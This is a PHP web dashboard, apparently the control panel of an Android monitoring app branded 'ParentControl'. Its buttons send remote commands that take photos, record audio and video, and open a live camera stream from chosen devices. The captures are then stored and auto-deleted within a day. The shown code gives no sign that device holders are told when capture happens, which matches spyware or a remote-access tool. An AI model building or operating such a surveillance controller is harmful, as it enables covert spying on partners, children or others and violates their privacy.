<?php
if (!file_exists(__DIR__ . '/config.php')) {
    header('Location: install.php');
    exit;
}
require_once 'config.php';

if (!isset($_SESSION['admin_id'])) {
    header('Location: login.php');
    exit;
}

try {
    $pdo = new PDO("mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=utf8mb4", DB_USER, DB_PASS, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception $e) {
    die('DB Connection failed: ' . $e->getMessage());
}

// Auto-delete expired media
$pdo->exec("DELETE FROM media_captures WHERE expires_at IS NOT NULL AND expires_at < NOW()");

// Stats
$devices = $pdo->query("SELECT COUNT(*) FROM devices")->fetchColumn();
$images  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='image'")->fetchColumn();
$audios  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='audio'")->fetchColumn();
$videos  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='video'")->fetchColumn();

$device_list = $pdo->query("SELECT * FROM devices ORDER BY last_seen DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
$recent_media = $pdo->query("SELECT * FROM media_captures ORDER BY captured_at DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ParentControl Dashboard</title>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#e6edf3;min-height:100vh}
.header{background:#161b22;padding:1rem 2rem;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #30363d}
.header h1{color:#58a6ff;font-size:1.4rem}a.logout{color:#f85149;text-decoration:none;font-size:.9rem}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;padding:1.5rem 2rem}
.stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1.2rem;text-align:center}
.stat h3{font-size:2rem;color:#58a6ff}.stat p{color:#8b949e;font-size:.85rem;margin-top:.4rem}
.section{padding:0 2rem 2rem}
.section h2{color:#f0f6fc;font-size:1.1rem;margin-bottom:1rem;border-bottom:1px solid #30363d;padding-bottom:.5rem}
.devices{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1rem}
.device-card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1rem}
.device-card h4{color:#58a6ff;margin-bottom:.5rem}
.device-card p{color:#8b949e;font-size:.8rem;margin:.2rem 0}
.btn{display:inline-block;padding:6px 12px;border-radius:6px;border:none;cursor:pointer;font-size:.8rem;margin:3px 2px}
.btn-blue{background:#1f6feb;color:#fff}.btn-green{background:#238636;color:#fff}.btn-red{background:#da3633;color:#fff}.btn-orange{background:#e3a81a;color:#fff}
.media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:1rem}
.media-card{background:#161b22;border:1px solid #30363d;border-radius:8px;overflow:hidden}
.media-card img{width:100%;height:130px;object-fit:cover}
.media-card audio,.media-card video{width:100%}
.media-card .info{padding:.6rem;font-size:.75rem;color:#8b949e}
.media-card .info strong{color:#e6edf3;display:block;margin-bottom:2px}
.live-view{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem}
.live-view video{width:100%;border-radius:6px;background:#000;max-height:400px}
#status-bar{background:#1c2128;padding:.5rem 2rem;font-size:.8rem;color:#8b949e;border-bottom:1px solid #30363d}
</style>
</head>
<body>
<div class="header">
  <h1>📱 ParentControl Dashboard</h1>
  <a href="logout.php" class="logout">Logout</a>
</div>
<div id="status-bar">🔌 Connecting to signaling server...</div>
<div class="stats">
  <div class="stat"><h3><?= $devices ?></h3><p>Devices</p></div>
  <div class="stat"><h3><?= $images ?></h3><p>Images Captured</p></div>
  <div class="stat"><h3><?= $audios ?></h3><p>Audio Clips</p></div>
  <div class="stat"><h3><?= $videos ?></h3><p>Videos Captured</p></div>
</div>

<div class="section">
  <h2>📡 Connected Devices</h2>
  <div class="devices" id="device-list">
    <?php foreach ($device_list as $d): ?>
    <div class="device-card" id="dev-<?= htmlspecialchars($d['device_id']) ?>">
      <h4><?= htmlspecialchars($d['device_name'] ?? $d['device_id']) ?></h4>
      <p>Last seen: <?= $d['last_seen'] ?? 'Never' ?></p>
      <p>ID: <?= htmlspecialchars($d['device_id']) ?></p>
      <button class="btn btn-blue" onclick="startLive('<?= htmlspecialchars($d['device_id']) ?>')">▶ Live View</button>
      <button class="btn btn-green" onclick="captureImage('<?= htmlspecialchars($d['device_id']) ?>')">📷 Photo</button>
      <button class="btn btn-orange" onclick="captureAudio('<?= htmlspecialchars($d['device_id']) ?>')">🎤 Audio</button>
      <button class="btn btn-red" onclick="captureVideo('<?= htmlspecialchars($d['device_id']) ?>')">🎬 Video</button>
    </div>
    <?php endforeach; ?>
  </div>
</div>

<div class="section" id="live-section" style="display:none">
  <h2>📺 Live View</h2>
  <div class="live-view">
    <video id="remote-video" autoplay playsinline muted></video>
  </div>
  <button class="btn btn-red" onclick="stopLive()">⛔ Stop Live</button>
</div>

<div class="section">
  <h2>🗂 Captured Media (Temporary – auto-delete after 24h)</h2>
  <div class="media-grid">
    <?php foreach ($recent_media as $m): ?>
    <div class="media-card">
      <?php
      $url = 'uploads/' . htmlspecialchars(basename($m['file_path']));
      if ($m['media_type'] === 'image'):
      ?>
        <img src="<?= $url ?>" alt="capture" onerror="this.src='data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\'><text y=\'20\'>No Preview</text></svg>'">
      <?php elseif ($m['media_type'] === 'audio'): ?>
        <div style="padding:1rem"><audio controls src="<?= $url ?>"></audio></div>
      <?php elseif ($m['media_type'] === 'video'): ?>
        <video controls src="<?= $url ?>" style="width:100%;max-height:130px"></video>
      <?php endif; ?>
      <div class="info">
        <strong><?= ucfirst($m['media_type']) ?> – <?= htmlspecialchars($m['device_id']) ?></strong>
        <?= date('d M Y H:i', strtotime($m['captured_at'])) ?>
        <a href="<?= $url ?>" download style="color:#58a6ff;margin-left:6px">⬇</a>
        <a href="delete_media.php?id=<?= $m['id'] ?>" style="color:#f85149;margin-left:6px" onclick="return confirm('Delete?')">🗑</a>
      </div>
    </div>
    <?php endforeach; ?>
  </div>
</div>

<script>
const NODE_URL = '<?= NODE_BACKEND_URL ?>';
const socket = io(NODE_URL, { reconnection: true, reconnectionDelay: 2000, reconnectionAttempts: Infinity });
let peerConnection = null, currentDeviceId = null;

socket.on('connect', () => {
  document.getElementById('status-bar').textContent = '✅ Connected to signaling server';
  socket.emit('join-as-controller', { deviceId: '__none__' });
});
socket.on('disconnect', () => {
  document.getElementById('status-bar').textContent = '🔴 Disconnected – reconnecting...';
});
socket.on('device-list-update', (devices) => {
  // Mark online devices
  devices.forEach(id => {
    const card = document.getElementById('dev-' + id);
    if (card) card.style.borderColor = '#238636';
  });
});

// Live WebRTC
async function startLive(deviceId) {
  currentDeviceId = deviceId;
  document.getElementById('live-section').style.display = 'block';
  socket.emit('join-as-controller', { deviceId });
  const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
  peerConnection = new RTCPeerConnection(config);
  peerConnection.ontrack = e => { document.getElementById('remote-video').srcObject = e.streams[0]; };
  peerConnection.onicecandidate = e => { if (e.candidate) socket.emit('ice-candidate', { to: deviceId, candidate: e.candidate }); };
}

socket.on('offer', async (data) => {
  if (!peerConnection) return;
  await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
  const answer = await peerConnection.createAnswer();
  await peerConnection.setLocalDescription(answer);
  socket.emit('answer', { to: data.from, sdp: answer });
});
socket.on('ice-candidate', async (data) => {
  if (peerConnection) await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
});

function stopLive() {
  if (peerConnection) { peerConnection.close(); peerConnection = null; }
  document.getElementById('remote-video').srcObject = null;
  document.getElementById('live-section').style.display = 'none';
}

function captureImage(deviceId) { socket.emit('capture-image', { deviceId, camera: 'front' }); alert('Image capture command sent!'); }
function captureAudio(deviceId) { socket.emit('capture-audio', { deviceId, duration: 10 }); alert('Audio capture (10s) command sent!'); }
function captureVideo(deviceId) { socket.emit('capture-video', { deviceId, duration: 15, camera: 'back' }); alert('Video capture (15s) command sent!'); }

// Receive base64 media from Android via Node, upload to PHP
socket.on('media-ready', (data) => {
  const formData = new FormData();
  const blob = b64toBlob(data.base64, data.mimeType);
  formData.append('file', blob, data.filename);
  formData.append('device_id', data.deviceId);
  formData.append('media_type', data.type);
  fetch('upload_media.php', { method: 'POST', body: formData })
    .then(r => r.json())
    .then(res => { if (res.success) location.reload(); })
    .catch(console.error);
});

function b64toBlob(b64, mime) {
  const bytes = atob(b64), arr = new Uint8Array(bytes.length);
  for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
  return new Blob([arr], { type: mime });
}
</script>
</body>
</html>
